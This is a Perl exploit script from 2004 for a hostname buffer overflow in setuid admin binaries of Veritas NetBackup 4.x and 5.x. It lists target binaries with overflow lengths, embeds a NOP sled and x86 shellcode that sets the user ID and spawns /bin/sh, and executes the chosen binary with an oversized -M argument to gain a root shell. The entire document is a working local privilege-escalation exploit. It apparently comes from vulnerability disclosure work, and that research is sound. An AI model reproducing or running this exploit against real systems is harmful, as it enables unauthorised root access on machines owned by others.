#!/usr/bin/perl -w
#
# Veritas Netbackup 4.x and 5.x hostname overflow
#
# kf (kf_lists[at]secnetops[dot]com) - 04/25/2004
#
# This bug has not been patched as of:
# VERSION NetBackup 5.0GA
#
# /usr/openv/netbackup/bin/nonroot_admin *MUST have been run*
# if not the setuids do NOT exist

$retval = 0xbffffdec;

$tgts{"0"} = "/usr/openv/netbackup/bin/admincmd/bpclschedrep:300";
$tgts{"1"} = "/usr/openv/netbackup/bin/admincmd/bperror:620";
$tgts{"2"} = "/usr/openv/netbackup/bin/admincmd/bpflist:1058";
$tgts{"3"} = "/usr/openv/netbackup/bin/admincmd/bpgetmedia:428";
$tgts{"4"} = "/usr/openv/netbackup/bin/admincmd/bpplinfo:300";
$tgts{"5"} = "/usr/openv/netbackup/bin/admincmd/bprdreq:300";
$tgts{"6"} = "/usr/openv/netbackup/bin/admincmd/bpretlevel:284";
$tgts{"7"} = "And about 20 others:6969";

unless (($target,$offset) = @ARGV) {

        print "\n        Veritas Netbackup hostname overflow, kf \(kf_lists[at]secnetops[dot]com\) - 04/25/2004\n";
        print "\n\nUsage: $0 <target> <offset> \n\nTargets:\n\n";

        foreach $key (sort(keys %tgts)) {
                ($a,$b) = split(/\:/,$tgts{"$key"});
                print "\t$key. $a . $b \n";
        }

        print "\n";
        exit 1;
}

$ret = pack("l", ($retval+$offset));
($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a, Len: $b, Offset: $offset, Ret: $ret ***\n\n";

$sc = "\x90"x1024;
$sc .= "\x31\xd2\x31\xc9\x31\xdb\x31\xc0\xb0\xa4\xcd\x80";
$sc .= "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b";
$sc .= "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd";
$sc .= "\x80\xe8\xdc\xff\xff\xff/bin/sh";
$ENV{"SNO"} = $sc;

$buf = "A" x $b;
$buf .= "$ret";

if ($target eq 0) {
exec("/usr/openv/netbackup/bin/admincmd/bpclschedrep a a -M $buf");
}
if ($target eq 1) {
exec("/usr/openv/netbackup/bin/admincmd/bperror -M $buf");
}
if ($target eq 2) {
exec("/usr/openv/netbackup/bin/admincmd/bpflist -M $buf");
}
if ($target eq 3) {
exec("/usr/openv/netbackup/bin/admincmd/bpgetmedia -M $buf");
}
if ($target eq 4) {
exec("/usr/openv/netbackup/bin/admincmd/bpplinfo a -M $buf");
}
if ($target eq 5) {
exec("/usr/openv/netbackup/bin/admincmd/bprdreq -M $buf");
}
if ($target eq 6) {
exec("/usr/openv/netbackup/bin/admincmd/bpretlevel -M $buf");
}
